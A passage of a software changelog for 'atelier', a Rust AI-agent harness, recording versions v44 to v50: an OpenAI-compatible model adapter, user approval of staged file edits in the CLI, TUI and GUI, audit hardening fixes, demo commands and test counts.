  - HTTP error mapping (`map_http_error`): 401→`Auth`, 429→`RateLimited` with `Retry-After` honored (clamped to `MIN_RATE_LIMIT_BACKOFF_MS=100`), 400 with `code: "context_length_exceeded"`→`ContextOverflow`, 5xx + other→`Provider`. Network/serde failures→`Network`/`Protocol` per the established taxonomy.
  - `to_openai_messages()` mapping: `System`/`User` inline; `Assistant` carries `tool_calls` as an array with `function.arguments` re-encoded as JSON strings; `Tool` role with required `tool_call_id`. Round-trips through the wire format.
  - Constants: `DEFAULT_BASE_URL=https://api.openai.com/v1`, `API_KEY_ENV=OPENAI_API_KEY`, `BASE_URL_ENV=OPENAI_BASE_URL`, `DEFAULT_MAX_TOKENS=4096`, `DEFAULT_CONTEXT_WINDOW_TOKENS=8192` (overridable via `with_context_window`).
  - **19 wiremock tests** covering: happy path, no-auth (empty key), tool calls, 401, 429 with Retry-After, 429 zero floor, context overflow, 500, malformed body, length finish reason, tools shape, assistant tool_calls round-trip, streaming text, streaming tool args, capabilities, context window override, token count, model-name parsing, `Debug` redaction.
- **`crates/atelier-core/src/adapter/mod.rs`** — `pub mod openai_compat;` next to `pub mod anthropic;`.
- **`crates/atelier-cli/src/runner.rs`** — new `ProviderChoice::OpenAiCompat { model_id, base_url: Option<String> }` variant. `Runner::new` reads `OPENAI_API_KEY` (empty string allowed — most local servers don't require auth; a 401 from a server that *does* require it surfaces as `AdapterError::Auth` on first call). `None` `base_url` falls back to `OPENAI_BASE_URL`, then to the adapter's `DEFAULT_BASE_URL`.
- **`crates/atelier-cli/src/main.rs`** — new `--base-url <URL>` flag and `openai-compat` provider arm. Usage text expanded with concrete defaults for the common local servers (LM Studio :1234, llama-server :8080, Ollama :11434). `--model` is now required for `openai-compat`; `--base-url` is rejected for any other provider with a clear error.

### Demo flow

```text
# Local-LLM dev loop (LM Studio with `qwen2.5-coder:7b` loaded):
$ cargo run -p atelier-cli -- run \
    --provider openai-compat \
    --base-url http://localhost:1234/v1 \
    --model local:qwen2.5-coder:7b \
    "add a hello() function to src/main.rs"

# Ollama via its OpenAI-compat surface:
$ cargo run -p atelier-cli -- run \
    --provider openai-compat \
    --base-url http://localhost:11434/v1 \
    --model local:llama3:8b \
    "fix the failing test in tests/parser_test.rs"

# OpenAI itself (omit --base-url; export OPENAI_API_KEY):
$ OPENAI_API_KEY=sk-... cargo run -p atelier-cli -- run \
    --provider openai-compat \
    --model openai:gpt-4o-mini \
    "..."
```

### v49 LOW residuals closed

- **LR-1** — `crates/atelier-core/src/session.rs`, `crates/atelier-cli/src/lib.rs`, `crates/atelier-gui/src/lib.rs`, `crates/atelier-gui/ui/src/App.svelte`. Doc-only: `CommitDecision` docstring updated to reflect the v49 emission order (per-file `EditStaged` → `LedgerAppended` → `CommitDecision`), `ApprovalPolicy` re-exported from `atelier_cli` for consumers, `remove_dir_all` symlink-safety comment, prompt-too-long error clarifies bytes vs chars, App.svelte `state`→`app` rename inline-documented.
- **LR-2** — `crates/atelier-tui/src/lib.rs`. `MAX_PROMPT_BYTES = 64 KiB` cap on `spawn_driver_run`'s prompt arg, parity with the GUI's v49 boundary check. Oversized prompts return `io::Error::new(InvalidInput, ...)` before any allocation grows. `event_stream_ended` one-shot semantics now documented inline.
- **LR-3** — `crates/atelier-core/src/dispatcher.rs`. Extended `session_dispatcher_broadcasts_edit_staged_for_writes` to assert `CommitDecision` arrives *after* `LedgerAppended` and that under `AutoApproveAll` the decision's `committed` set lists every changed file with `dropped` empty. Locks the v49 ordering fix against regression.
- **LR-4** — Deferred (low-value, deeper refactor — atelier-tui's `_run_task: Option<JoinHandle>` would need a `Drop` to abort the spawned task; revisit when the TUI driver mode grows a quit-while-running scenario beyond the current end-of-run cleanup).

### Verified

- `cargo fmt --check` clean.
- `cargo clippy --workspace --all-targets -- -D warnings` clean.
- `cargo test --workspace` → **atelier-core 438** (was 419; +19 openai_compat tests) + **atelier-cli 14** + **atelier-gui 12** + **atelier-tui 46**. All green.
- `make check` — schemas + 52 artifacts + 112 rig tests + 11 dry-runs all OK.

### Rig counts
- **21 schemas / 52 artifacts / 112 tests / 11 dry-runs / 438 atelier-core unit tests + 14 atelier-cli integration tests + 12 atelier-gui unit tests + 46 atelier-tui unit tests** (atelier-core +19 from v49).

### Phase-1 BYOM status
- **Mock** (in-tree, `MockAdapter`) — v0
- **Anthropic** Messages API — v45
- **OpenAI-compatible** (LM Studio, llama-server, vLLM, sglang, Ollama-compat, OpenAI) — **v50**
- **Bedrock / Vertex** — Phase E/F

## v49 — 2026-05-17

**Audit follow-up: ten v48 deep-scan findings fixed.** No new features — all hardening / correctness against the cross-cutting concerns the v48 scan surfaced. Highest-impact items: event-ordering inversion, missing Runner cleanup on error paths, no concurrent-run guard in the GUI, prototype-pollution surface in DiffPane's accept toggle, mount-race losing the first run's events.

- **`crates/atelier-core/src/dispatcher.rs`** — FIX-1. `ApprovalGate::notify_outcome` removed; the dispatcher's commit branch now builds an `ApprovalSummary { commit_id, committed, dropped }` and stores it on `DispatchOutcome.approval_summary`. `SessionDispatcher::dispatch` emits the bus events in the canonical user-visible-first order: per-file `EditStaged` → `LedgerAppended` → `CommitDecision`. Closes the v48 audit's "documented intent inverted" finding.
- **`crates/atelier-cli/src/runner.rs`** — FIX-2. New `DispatcherHandleGuard` private struct with a `Drop` impl that runs on every exit path from `Runner::run` (success, `?`-propagated errors, panic). Pre-v49 the `handle.clear()` was a tail call only the success path reached — an error mid-loop would leave a stale Arc pointing at a torn-down dispatcher.
- **`crates/atelier-gui/src/lib.rs`** — FIX-3 + FIX-5 + FIX-10. `SessionState.run_in_flight: Arc<AtomicBool>` guards against concurrent `start_demo_run` calls (compare_exchange Acquire/Relaxed; rejected calls return a typed error the frontend surfaces). `MAX_PROMPT_BYTES = 64 KiB` cap on the Tauri command's `prompt` argument so a multi-GB string can't OOM the process before any rejection. Each `start_demo_run` now creates a fresh UUID-named subdirectory under `workspace_root`; a new `RunCleanup` Drop guard on the spawned task clears the run-in-flight flag *and* (best-effort) removes the per-run workspace on every exit path — solving both "v47 demo clobbered by v48 demo" and "workspace leak across launches."
- **`crates/atelier-cli/src/lib.rs`** + **runner.rs** — FIX-4. Documented that `pub mod runner;` is a deliberate test affordance, not a supported API surface, and re-export the blessed types (`Runner`, `ProviderChoice`, `MockResponse`, `EventSink`, `RunError`, `RunReport`, `DispatcherHandle`) at the crate root. Verified the `runner` module's internal helpers (`extract_native_envelope`, `built_in_registry`, `now_rfc3339`, `days_to_ymd`, `registry_to_tool_specs`, `build_mock_adapter`, `spawn_sink_drain`, `adapter_to_run_error`) are all module-private `fn`, not `pub` — they were never actually reachable as `atelier_cli::runner::*`. The audit's HIGH finding was over-stated; the only real leak was `read_prompt` (binary-internal but `pub` because the bin crate is separate from the lib crate), now documented.
- **`crates/atelier-tui/src/lib.rs`** — FIX-6 + FIX-8. New `event_stream_ended: bool` flag gates the `recv` arm of the run loop's `tokio::select!` via the `, if !event_stream_ended` guard — closes the v48 busy-loop where the post-RunEnded `never_rx` re-fired `None` on every poll, appending "RunEnded" lines forever. `render_pending_diff` banner replaced the v46-era developer text ("submit via `SessionDispatcher::submit_approval(commit_id, accepted)`") with a coloured user-facing line: "press **y** to accept all · **n** to reject all" — matching the keys the v48 handler already binds.
- **`crates/atelier-gui/ui/src/lib/components/DiffPane.svelte`** — FIX-7. `acceptedPaths` switched from a literal `Record<string, boolean>` (vulnerable to prototype pollution when paths like `__proto__` or `constructor` are used as keys) to `Object.create(null)` — a null-prototype object that can't reach `Object.prototype`. `togglePath` does a copy-on-write update so Svelte's reactivity proxy still sees the assignment. Also added `submitError` state — when `submit_approval` returns false (stale commit_id), the user now sees an inline red error instead of a silent `console.warn`. The Tauri command's return value is now consumed (previously discarded).
- **`crates/atelier-gui/ui/src/App.svelte`** — FIX-9. New `listenerReady: boolean` state; `composerBusy` derived from `!listenerReady || runBusy` so the Composer's Send button is disabled until `await listen('atelier://event')` resolves. Pre-v49 a fast user could click Send before mount finished and lose the first run's events. Local state var renamed `state` → `app` to dodge a TypeScript-mode quirk in svelte-check that was treating `let state = $state(...)` as the Svelte-3-era store-auto-subscribe syntax.

Verified: `cargo test --workspace` → **atelier-core 419 + atelier-cli 14 + atelier-gui 12 + atelier-tui 46** (unchanged test counts — these are correctness fixes, not new tests; the existing tests still pass through the refactor); `cargo fmt --check` clean; `cargo clippy --workspace --all-targets -- -D warnings` clean; `npm run check` → 94 files, 0 errors, 0 warnings; `npm run build` → 62.6 kB JS / 22.8 kB gzip; `make check` green.

### Findings still deferred (per v48 audit)

These are documented in the audit but deferred — they're lower-impact or require deeper refactors:

- `dispatcher.rs:613` — `rx.await.unwrap_or_default()` collapses "user explicitly rejected" with "consumer dropped oneshot" into the same empty-Vec result.
- `session.rs:192-199` — `PendingFile` drops `SyntaxOutcome`; UI can't show grammar-missing/not-applicable badges.
- `state.rs` — `AwaitingApproval` transitions defined but never emitted (matters when §4 checkpoint replay lands).
- `atelier-cli/tests/run_integration.rs` — `#[path]` test still compiles a second copy of runner.rs (low-impact; would require migrating tests to use the lib).
- `atelier-tui` — `_run_task: Option<JoinHandle>` doesn't abort the task on Drop (runner keeps executing in background after user quits).
- Hand-rolled `now_rfc3339` instead of `chrono`/`time` dep.

### Rig counts
- **21 schemas / 52 artifacts / 112 tests / 11 dry-runs / 419 atelier-core unit tests + 14 atelier-cli integration tests + 12 atelier-gui unit tests + 46 atelier-tui unit tests** (unchanged from v48).

## v48 — 2026-05-17

**TUI driver mode lands.** Same v47 pattern, terminal edition: pass a prompt as `argv[1]` and the TUI builds a `Runner` with `AwaitApproval` policy, drives a scripted MockAdapter run, pops the pending-diff banner with the `(PENDING)` title, waits for `y`/`n`, routes the decision to the live `SessionDispatcher::submit_approval`. `cargo run -p atelier-tui -- "rename foo"` is now a working end-to-end demo of the spec §3 hunk accept/reject contract from a terminal.

- **`crates/atelier-tui/Cargo.toml`** — TD-A. Added `atelier-cli` + `serde_json` workspace deps (same hop the GUI takes in v47).
- **`crates/atelier-tui/src/lib.rs`** — TD-B + TD-C. Two new `InputOutcome` variants: `AcceptAll`, `RejectAll`. `handle_key` signature changed to `handle_key(key, pending: Option<&PendingApproval>)`; `y`/`n` only return their accept/reject outcomes when `pending` is `Some`, otherwise they fall through to `Continue` (keeps the keys safe for a future text-input mode). The run loop gained two modes:
  - **Driver mode** (when `argv[1]` is a non-empty prompt): builds a Runner with `AwaitApproval` + `DispatcherHandle`, `EventSink::Callback` feeds an mpsc that the select-loop drains. `y` accepts every pending file via `submit_approval(commit_id, all_paths)`; `n` rejects with an empty accept-set.
  - **Viewer mode** (no prompt arg): preserved v45 behaviour — spawns a NoopHook session, forwards its broadcast onto the same mpsc. Useful for testing the terminal lifecycle in isolation.
  - New helpers: `spawn_driver_run`, `submit_pending`, `first_word_or_default` (mirror of the GUI's helper of the same name; same sanitisation rules).
- **`crates/atelier-tui/src/lib.rs`** (render path) — `render_help` now pivots to a yellow bold `APPROVAL REQUIRED · y accept all · n reject all · q quit` line when `pending_approval` is set, returning to the scrub-keys footer once `CommitDecision` clears the pending state.
- **5 new tests** (`handle_key_emits_accept_all_on_y_when_pending`, `..._reject_all_on_n_when_pending`, `..._y_and_n_are_inert_when_no_pending`, `help_footer_swaps_to_approval_hints_when_pending`, `help_footer_returns_to_scrub_hints_after_decision`) lock the y/n contract + footer pivot. Existing handle_key tests updated to pass the new `pending` argument (always `None` for non-approval cases).

Verified: `cargo test --workspace` → **atelier-core 419 + atelier-cli 14 + atelier-gui 12 + atelier-tui 46** (was 419 / 14 / 12 / 41 in v47; +5 TUI tests for the approval keys + footer pivot); `cargo fmt --check` clean; `cargo clippy --workspace --all-targets -- -D warnings` clean; `make check` green.

### Demo flow

```text
$ cargo run -p atelier-tui -- "rename my-script"

  ratatui terminal opens
  ↓ Runner spawns, scripts a write_file → my-script.txt
  ↓ dispatcher hits AwaitApproval
  ↓ TUI DiffPane shows yellow (PENDING) box with my-script.txt
  ↓ footer pivots to "APPROVAL REQUIRED · y accept all · n reject all · q quit"

  user presses y
  ↓ submit_pending() calls SessionDispatcher::submit_approval(commit_id, [my-script.txt])
  ↓ dispatcher resumes, runs commit_selected
  ↓ EditStaged + CommitDecision land on the bus
  ↓ pending banner clears
  ↓ footer returns to "q quit · [ prev · ] next · g HEAD"

  on disk: /tmp/atelier-tui-<pid>-<nanos>/my-script.txt now contains
  the demo write
```

### Phase C status — both UIs are now drivers

| Surface | v45 | v46 | v47 | v48 |
|---|---|---|---|---|
| TUI rendering | ✓ multi-pane | ✓ pending state | ✓ pending state | ✓ |
| TUI driver | — | — | — | ✓ (v48) |
| GUI rendering | ✓ multi-pane | ✓ pending state | ✓ pending state | ✓ |
| GUI driver | — | — | ✓ (v47) | ✓ |
| Hunk accept/reject contract | — | ✓ (file-level) | ✓ | ✓ |

### Rig counts
- **21 schemas / 52 artifacts / 112 tests / 11 dry-runs / 419 atelier-core unit tests + 14 atelier-cli integration tests + 12 atelier-gui unit tests + 46 atelier-tui unit tests** (was 21 / 52 / 112 / 11 / 419 / 14 / 12 / 41).

## v47 — 2026-05-17

**GUI becomes a driver — hunk accept/reject works end-to-end through the webview.** The Svelte DiffPane's accept/reject buttons now route to a live `SessionDispatcher::submit_approval`, not a logging stub. The GUI builds + drives its own scripted run with `AwaitApproval` policy; the user types a prompt in the new Composer, sees the staging banner appear, clicks accept (or rejects per-file), and watches the committed write land in the workspace.

- **`crates/atelier-cli/Cargo.toml`** — DR-A. Hybrid lib+bin. New `[lib] name = "atelier_cli"` so the runner is reachable from other crates (atelier-gui in particular). Binary `[[bin]] atelier` unchanged.
- **`crates/atelier-cli/src/lib.rs`** — DR-A. New module that re-exports the runner's public surface (`Runner`, `ProviderChoice`, `MockResponse`, `EventSink`, `RunError`, `RunReport`).
- **`crates/atelier-cli/src/main.rs`** — switched from `mod runner;` to `use atelier_cli::runner;` so the binary and the library share one source file.
- **`crates/atelier-cli/src/runner.rs`** — DR-B. New `DispatcherHandle` (a shared `Arc<parking_lot::Mutex<Option<Arc<SessionDispatcher>>>>`) that the runner populates as soon as the dispatcher is built and clears on shutdown. New builder methods `Runner::with_approval_policy(ApprovalPolicy)` and `Runner::with_dispatcher_handle(DispatcherHandle)`. The dispatcher is now wrapped in `Arc` so the handle hand-off is cheap. New `EventSink::Callback(Arc<dyn Fn(&Event) + Send + Sync>)` variant — the drain task invokes the callback per event. The GUI uses it to forward bus events into the Tauri webview without standing up an external broadcast subscription.
- **`crates/atelier-gui/Cargo.toml`** — DR-C. Added `atelier-cli` and `parking_lot` workspace deps.
- **`crates/atelier-gui/src/lib.rs`** — DR-C + DR-D. `SessionState` redesigned: drops the pre-spawned session, holds a `DispatcherHandle` + an ephemeral `workspace_root` per process. `submit_approval` Tauri command now reads the dispatcher from the handle and calls `SessionDispatcher::submit_approval(commit_id, accepted)` for real. New `start_demo_run(prompt)` Tauri command — builds a `Runner` with `MockAdapter` scripted to emit a `write_file` + `harness_meta` envelope, installs `AwaitApproval` policy + the `DispatcherHandle`, wires `EventSink::Callback` to forward bus events to the webview as `atelier://event`, spawns the run loop on `tauri::async_runtime`. The file name is derived from the prompt's first word so the user sees their input reflected on disk.
- **`crates/atelier-gui/ui/src/lib/components/Composer.svelte`** — DR-E. New textarea + Send button at the bottom of the workspace. Cmd/Ctrl+Enter submits. Disabled while a run is in flight (`busy` derived from `state.currentState`). Errors from the Tauri command surface inline.
- **`crates/atelier-gui/ui/src/App.svelte`** — wires `Composer` into the layout grid (header / panes / composer / footer). `runBusy` derived from `currentState` so Composer disables itself during the run.
- **`crates/atelier-cli/tests/run_integration.rs`** — DR-F. Two new tests (`await_approval_via_runner_with_dispatcher_handle_round_trips` and `..._full_reject_drops_the_write`) prove the Runner-side contract exactly matches what the GUI's `start_demo_run` builds: spawn a run with AwaitApproval + DispatcherHandle, watch the captured events for `StagingPendingApproval`, call `dispatcher.submit_approval` (accept-all or full-reject), verify the run terminates in `Done` and the file does/doesn't land on disk. Also asserts `DispatcherHandle.get()` returns `None` after the run shuts down (clean-up contract).

Verified: `cargo test --workspace` → **atelier-core 419 + atelier-cli 14 + atelier-gui 12 + atelier-tui 41** (was 419 / 12 / 12 / 41 in v46; +2 cli integration tests for the GUI-shaped driver path); `cargo fmt --check` clean; `cargo clippy --workspace --all-targets -- -D warnings` clean; `npm run check` → 94 files, 0 errors, 0 warnings; `npm run build` → 62.3 kB JS bundle (22.7 kB gzip); `make check` green.

### What still isn't wired

- **Real-provider runs**: `start_demo_run` is scripted (MockAdapter). Routing live `--provider anthropic` runs from the GUI needs API-key input + provider selector + the lifecycle of multi-turn flows; v47 stops at "the demo proves the end-to-end approval contract end-to-end."
- **Per-hunk granularity**: still file-level. Sub-file accept/reject requires reworking `Staging::commit_selected` to accept `Vec<(PathBuf, HunkSet)>`.
- **TUI driver mode**: TUI is still bootstrap + render. Wiring it as a driver follows the same `DispatcherHandle` pattern; the API is now ready.
- **State-machine `AwaitingApproval` transition**: still not emitted by the runner. The dispatcher blocks correctly on its oneshot but the `State` enum doesn't move through `AwaitingApproval` during the wait. Cosmetic for now; matters when checkpoints/replay land in §4.

### Rig counts
- **21 schemas / 52 artifacts / 112 tests / 11 dry-runs / 419 atelier-core unit tests + 14 atelier-cli integration tests + 12 atelier-gui unit tests + 41 atelier-tui unit tests** (was 21 / 52 / 112 / 11 / 419 / 12 / 12 / 41).

## v46 — 2026-05-17

**§3 hunk accept/reject lands at the contract level.** The dispatcher now gates commit on user approval when configured to do so. The flow: tool stages → dispatcher emits `StagingPendingApproval` → consumer (TUI/GUI) shows pending diff with accept/reject controls → consumer calls `SessionDispatcher::submit_approval(commit_id, accepted)` → dispatcher resumes, calls `StagedBatch::commit_selected(accepted)`, emits `CommitDecision` then `EditStaged` for each committed file. The pure Rust contract is end-to-end tested; the GUI's `submit_approval` Tauri command logs the intent today (the GUI doesn't yet drive its own dispatcher — that wiring lands when the GUI grows from viewer into driver).

- **`crates/atelier-core/src/staging.rs`** — HR-A. `Staging::commit()` split into `Staging::stage() -> StagedBatch` + `StagedBatch::commit_selected(accepted) -> CommitReport` + `StagedBatch::commit_all()`. Existing `Staging::commit()` preserved as `stage().commit_all()` for callers that don't want approval gating. `StagedBatch` owns the `TempDir`; dropping it without committing discards the temp tree (same all-or-nothing semantic as v45). Not `Clone` (duplicating the handle would race for the same staged paths). 7 new tests: stage-no-rename, commit_all parity, commit_selected partial-accept, empty-accept full-reject, idempotent stale-path ignore, drop-without-commit cleanup, commit() === stage().commit_all().
- **`crates/atelier-core/src/dispatcher.rs`** — HR-B + HR-D. `ToolResult.staged_writes: Option<CommitReport>` → `Option<StagedBatch>`; `ToolResult` dropped `Clone` derive (no caller used it). New `ApprovalGate` async trait + default `AutoApprove` impl (commits all) + `PendingApprovalGate` impl on the SessionDispatcher (emits `StagingPendingApproval`, waits on oneshot). New `ApprovalPolicy { AutoApproveAll (default), AwaitApproval }`. `Dispatcher::with_approval_gate` + `SessionDispatcher::with_approval_policy` builder methods. New `SessionDispatcher::submit_approval(commit_id, accepted) -> bool` (returns `false` when commit_id is unknown). The dispatcher's commit step now: stage → gate.approve(commit_id, pending) → commit_selected(accepted) → gate.notify_outcome(committed, dropped) → events. Commit failures fold into `ToolError::ExecutionFailed`. 3 new tests: pending-event + selective accept, full-reject drops everything, submit_approval for unknown commit_id returns false. EchoTool test fixture rewritten to build a real `StagedBatch` against a tempdir workspace (was a synthetic CommitReport).
- **`crates/atelier-core/src/state.rs`** — HR-C. New `State::AwaitingApproval` variant. New transitions: `ToolExecuting → AwaitingApproval`, `AwaitingApproval → ToolExecuting`, `AwaitingApproval → Failed`.
- **`crates/atelier-core/src/session.rs`** — HR-C. New `Event::StagingPendingApproval { commit_id: Uuid, files: Vec<PendingFile> }` (PendingFile carries path + hunks) and `Event::CommitDecision { commit_id, committed: Vec<PathBuf>, dropped: Vec<PathBuf> }`. Approval routing is deliberately NOT a session::Command — the actor's job is "validate transitions, fire hooks"; the approval lifecycle lives next to the staging it controls. Documented in-place.
- **`crates/atelier-core/src/tools/write_file.rs`, `tools/edit_file.rs`** — HR-B. Tools call `Staging::stage()` instead of `.commit()` and return `StagedBatch` in `staged_writes`. The dispatcher's auto-approve path produces identical end-state behaviour. Existing tool unit tests updated to call `commit_all()` themselves to verify on-disk results (they're testing the tool, not the dispatcher).
- **`crates/atelier-tui/src/lib.rs`** — HR-E. `AppState.pending_approval: Option<PendingApproval>` + `PendingApprovalFile` types. `apply()` folds `StagingPendingApproval` → set pending, `CommitDecision` → clear pending. `render_diff` defers to new `render_pending_diff` when pending is set — yellow `(PENDING)` title + banner + per-file path list. New `hunks_kind_label` / `short_uuid` helpers. `project_event` covers the two new variants. 4 new tests: apply records pending, decision clears pending, render shows badge + path, render returns to normal after decision. Total TUI tests: 41 (was 37).
- **`crates/atelier-tui/Cargo.toml`** — `uuid` workspace dep added (for `PendingApproval.commit_id`).
- **`crates/atelier-gui/src/lib.rs`** — HR-F. `bridge_event` covers `StagingPendingApproval` + `CommitDecision`. New Tauri command `submit_approval(commit_id, accepted) -> bool` — currently a logging stub; real routing waits on the GUI shell becoming a driver. 2 new bridge tests.
- **`crates/atelier-gui/Cargo.toml`** — `uuid` workspace dep added.
- **`crates/atelier-gui/ui/src/lib/state.ts`** — HR-F. `PendingApprovalFile` + `PendingApproval` types; `AppState.pendingApproval: PendingApproval | null`. `applyEvent` handles both new variants (mirror of TUI `apply()`). `projectEvent` covers both for the event log.
- **`crates/atelier-gui/ui/src/lib/components/DiffPane.svelte`** — HR-F. New `pendingApproval` prop. When non-null, renders an APPROVAL banner with commit-id, per-file checkboxes, "accept selected" / "reject all" buttons. Buttons invoke the `submit_approval` Tauri command. Yellow border + bold `PENDING` title visually distinguish from the committed-diff path. Per-file accept-toggle state resets when a new pending arrives (UX: "review and reject what you don't want", not "opt in to every file").
- **`crates/atelier-gui/ui/src/App.svelte`** — threads `pendingApproval` from app state into `DiffPane`.

Verified: `cargo test --workspace` → **atelier-core 419 + atelier-cli 12 + atelier-gui 12 + atelier-tui 41** (was 409 / 12 / 10 / 37 in v45; +16 new tests across HR-A through HR-F); `cargo fmt --check` clean; `cargo clippy --workspace --all-targets -- -D warnings` clean; `npm run check` → 0 errors, 0 warnings; `npm run build` → 59.8 kB JS bundle (21.8 kB gzip); `make check` green.

The `submit_approval` Tauri command in `atelier-gui/src/lib.rs` is a logging stub. The GUI shell today is a viewer of events from a session running elsewhere (the production driver is `atelier run` in atelier-cli). Routing the approval back to a live `SessionDispatcher::submit_approval` requires the GUI to drive its own session — a separate piece of work that builds on this contract. Until then, the bus + state-machine + dispatcher round-trip is exercised end-to-end via `await_approval_emits_pending_event_and_blocks_until_submit` in `dispatcher::tests` (drives the full round-trip via direct `submit_approval` calls).

### Rig counts
- **21 schemas / 52 artifacts / 112 tests / 11 dry-runs / 419 atelier-core unit tests + 12 atelier-cli integration tests + 12 atelier-gui unit tests + 41 atelier-tui unit tests** (was 21 / 52 / 112 / 11 / 409 / 12 / 10 / 37).

## v45 — 2026-05-17

**§3 GUI multi-pane workspace lands.** Mirrors the v43/v44 TUI subset in the Tauri webview. Same data contract (the `atelier://event` bus), same panes (conversation / plan / diff / cost+context meters), same scrubber keys. With v44's producer-side wiring already on the bus, `cargo tauri dev` now renders a live four-pane workspace fed by a real session.

- **`crates/atelier-gui/ui/src/lib/state.ts`** — pure-TS state module mirroring the TUI's `AppState`. Same field shapes, same caps (`MAX_CONVERSATION_LINES = 1000`, `MAX_DIFF_HISTORY = 16`, `MAX_EVENT_LOG = 1000`, `DEFAULT_CONTEXT_WINDOW_TOKENS = 200000`), same `applyEvent` reducer logic as the Rust `AppState::apply`. Types: `BridgedEvent`, `ConversationRole`, `ConversationLine`, `Hunks`, `Hunk`, `LineRange`, `StagedEdit`, `PlanStatus`, `PlanStep`, `LedgerEntry`, `AppState`. Functions: `initialState()`, `applyEvent(state, event)`, `applyScrub(state, cmd)`, `projectEvent(event)`, `roleColour(role)`. Pure — no DOM, no Svelte runes; components wrap in `$state` themselves. Mirroring keeps the contract parallel for the day a vitest harness lands.
- **`crates/atelier-gui/ui/src/app.css`** — global theme tokens. Palette mirrors the TUI's ratatui colours (user=yellow, assistant=cyan, tool=magenta, system=grey; diff add=green, remove=red, hunk-header=blue) so users switching between surfaces see the same visual contract. Plain CSS variables; per-component styles reference `var(--*)`.
- **`crates/atelier-gui/ui/src/lib/components/Header.svelte`** — app brand + meta strip: `state=<label>`, `EditStaged=N`, `scrub=HEAD|-N`. Yellow when pinned, green when at HEAD — same colours as the TUI header.
- **`crates/atelier-gui/ui/src/lib/components/ConversationPane.svelte`** — role-prefixed list, auto-scrolls to bottom on new messages via `$effect` watching `conversation.length`. Each line is a 2-column grid: role label (right-aligned, role-coloured) + text (`white-space: pre-wrap`, breaks long words).
- **`crates/atelier-gui/ui/src/lib/components/DiffPane.svelte`** — renders the head of `recentEdits` with full `Hunks` variant coverage: `Lines` produces per-hunk `@@ -old,len +new,len @@` headers + `-`/`+` lines; `Created` / `Deleted` / `Binary` / `Same` show coloured badges. Uses a Svelte 5 `{#snippet}` for the hunk block so the markup stays factored.
- **`crates/atelier-gui/ui/src/lib/components/PlanPane.svelte`** — step glyphs (`[ ]` / `[▸]` / `[✓]` / `[~]`) coloured by status, constraints indented under each step, terminal-status steps render strike-through with muted text.
- **`crates/atelier-gui/ui/src/lib/components/MetersPane.svelte`** — cost as `$0.XXXX` (yellow, no upper bound); context as a custom progress bar with `known/window` label and an explicit `+N unknown` suffix when `unknown > 0` so a silently-underreporting meter is visible (spec §5 contract). ARIA `role="progressbar"` for accessibility.
- **`crates/atelier-gui/ui/src/App.svelte`** — composes the four panes plus header + footer. CSS grid: header / `(conversation 60% | plan 40%)` / `(diff 60% | meters 40%)` / footer. Subscribes to `atelier://event` once, runs every payload through `applyEvent`, passes typed slices to each child. Owns the keyboard listener: `[` / `]` / `g` route through `applyScrub` for parity with the TUI scrubber.
- **`crates/atelier-gui/src/lib.rs`** — unchanged from v44; the bridge already projects all four new variants.

Verified: `npm run check` → 92 files, 0 errors, 0 warnings; `npm run build` → 56.5 kB JS bundle (20.7 kB gzip), 7.6 kB CSS. `cargo fmt --check` clean; `cargo clippy --workspace --all-targets -- -D warnings` clean; `cargo test --workspace` → atelier-core 409 + atelier-cli 12 + atelier-gui 10 + atelier-tui 37 (unchanged from v44 — no new Rust); `make check` green.

The webview is not exercised in CI (no PTY-equivalent for Tauri), but the contract is pinned at three levels: (1) `bridge_event` unit tests in atelier-gui Rust assert the JSON shape every variant produces; (2) the pure-TS `state.ts` reducer is structurally identical to the TUI's Rust `apply()` — same caps, same fold semantics, same fallbacks; (3) `svelte-check` catches typos against `BridgedEvent` payload shapes.

### Rig counts
- **21 schemas / 52 artifacts / 112 tests / 11 dry-runs / 409 atelier-core unit tests + 12 atelier-cli integration tests + 10 atelier-gui unit tests + 37 atelier-tui unit tests** (Rust totals unchanged from v44; +1 frontend bundle).

## v44 — 2026-05-17

**Producer side of the §3/§5 broadcast bus wired.** Four new `Event` variants on the bus, emitted by the dispatcher + turn driver, consumed by both UIs. The v43 TUI multi-pane widgets already rendered conversation / plan / cost / context from `AppState` fields; pre-v44 nothing populated those fields in a real run. Now: `cargo run -p atelier-cli run --provider mock "..."` drives a live conversation pane, plan canvas, cost meter, and context meter end-to-end. Closes the producer-side gap the v43 TUI subset deferred.

- **`crates/atelier-core/src/session.rs`** — `Event` extended with `MessageCommitted { role, text }`, `PlanSnapshot { steps }`, `LedgerAppended { entry }`, `ContextSnapshot { known_tokens, unknown_tokens }`. New `MessageRole { System, User, Assistant, Tool }` enum (duplicated from `adapter::Role` to keep `session` free of an `adapter` dep). Snapshot-shaped events (not deltas) so a late-joining subscriber converges on the next event without replay.
- **`crates/atelier-core/src/dispatcher.rs`** — `SessionDispatcher::dispatch` now broadcasts `LedgerAppended` after every ledger append. Ordering matters: `EditStaged` (user-visible side effects) ships BEFORE `LedgerAppended` (bookkeeping) so a UI consumer rendering both a diff pane and a cost meter sees the diff arrive first. Failed tool calls still emit `LedgerAppended` (cost meter must count the failed call against the trust budget — spec §1 doesn't carve out a "free failure" path); `EditStaged` is not emitted in that case (no staged writes).
- **`crates/atelier-cli/src/runner.rs`** — turn driver now broadcasts: `MessageCommitted::User` for the initial prompt, `MessageCommitted::Assistant` after each model turn, `MessageCommitted::Tool` after each tool result. Maintains a `PlanCanvas` across turns, applies `envelope.plan_update` on each turn, and emits `PlanSnapshot` per turn. Emits `ContextSnapshot { known_tokens, unknown_tokens: 0 }` at end-of-turn via `adapter.count_tokens(&messages)` (the runner doesn't yet wire a full §5 ContextManager; once it does, `unknown_tokens` will reflect the `TokenSource::Unavailable` items).
- **`crates/atelier-tui/src/lib.rs`** — `AppState::apply` extended to consume the four new variants: `MessageCommitted` → `push_conversation`; `PlanSnapshot` → rebuild `PlanCanvas` from the snapshot vec; `LedgerAppended` → fold per-entry cost into `total_cost_usd` (CacheBust entries carry no cost field and are skipped, not zeroed); `ContextSnapshot` → update `context_tokens`. New `ConversationRole::from_message_role` exhaustive mapping so adding a `MessageRole` variant later forces a deliberate decision. `ledger_entry_cost` helper centralises the per-variant cost extraction. `project_event` extended for the new variants in the event log.
- **`crates/atelier-gui/src/lib.rs`** — `bridge_event` projects the four new variants onto the webview JSON shape: `MessageCommitted` → `{ role, text }`; `PlanSnapshot` → `{ steps }`; `LedgerAppended` → `{ entry }`; `ContextSnapshot` → `{ known_tokens, unknown_tokens }`. The frontend `App.svelte` will consume these in the next iteration.
